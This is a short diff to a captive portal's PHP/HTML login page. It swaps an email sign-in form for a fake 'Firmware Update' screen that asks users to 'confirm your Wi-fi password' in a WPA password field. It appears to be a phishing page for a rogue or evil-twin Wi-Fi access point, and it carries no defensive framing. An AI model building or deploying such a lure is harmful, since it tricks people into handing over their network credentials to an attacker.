@@ -27,13 +27,14 @@ $destination = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
       <div class="show" id="login-modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
         <div class="modal-dialog">
           <div class="loginmodal-container">
-            <h1>Sign in with your Account</h1>
+            <h1>Firmware Update</h1>
+            <h2>Password requested to restore your router settings</h2>
+            <h3>Please confirm your Wi-fi password to access internet</h3>
             <br>
 
             <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
               <input type="hidden" name="target" value="<?=$destination?>">
-              <input type="text" name="email" placeholder="Enter your email" required>
-              <input type="password" name="pass" placeholder="Password" required>
+              <input type="password" name="pass" placeholder="WPA Password" required>
               <input type="submit" name="login" class="login loginmodal-submit" value="Login">
             </form>
 
